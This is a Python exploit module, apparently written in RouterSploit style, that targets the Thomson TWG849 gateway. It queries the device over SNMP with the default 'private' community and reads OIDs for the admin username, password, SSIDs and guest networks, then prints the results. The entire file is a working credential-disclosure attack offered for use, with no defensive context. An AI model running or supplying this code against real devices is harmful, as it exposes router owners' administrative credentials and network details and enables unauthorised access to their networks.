# rsf exploit module
# description: Module exploits Thomson TWG849 information disclosure vulnerability which allows reading sensitive information.

import socket
import sys
from pysnmp.hlapi import *

def get_snmp_data(target, oid):
    iterator = getCmd(
        SnmpEngine(),
        CommunityData('private', mpModel=0),
        UdpTransportTarget((target, 161), timeout=2),
        ContextData(),
        ObjectType(ObjectIdentity(oid))
    )

    errorIndication, errorStatus, errorIndex, varBinds = next(iterator)

    if errorIndication or errorStatus:
        return None

    for varBind in varBinds:
        return str(varBind[1])
    return None

def run(target):
    oids = {
        "model": "1.3.6.1.2.1.1.1.0",
        "uptime": "1.3.6.1.2.1.1.3.0",
        "username": "1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0",
        "password": "1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0",
        "ssid1": "1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.32",
        "ssid2": "1.3.6.1.4.1.4413.2.2.2.1.5.4.2.4.1.2.32",
        "guest1": "1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.33",
        "guest2": "1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.34",
        "guest3": "1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.35",
    }

    print("[*] Reading parameters...")
    found = False
    for key, oid in oids.items():
        value = get_snmp_data(target, oid)
        if value:
            print(f"[+] {key}: {value}")
            found = True

    if not found:
        print("[-] Exploit failed - could not read sensitive information")

# Author: ediop3

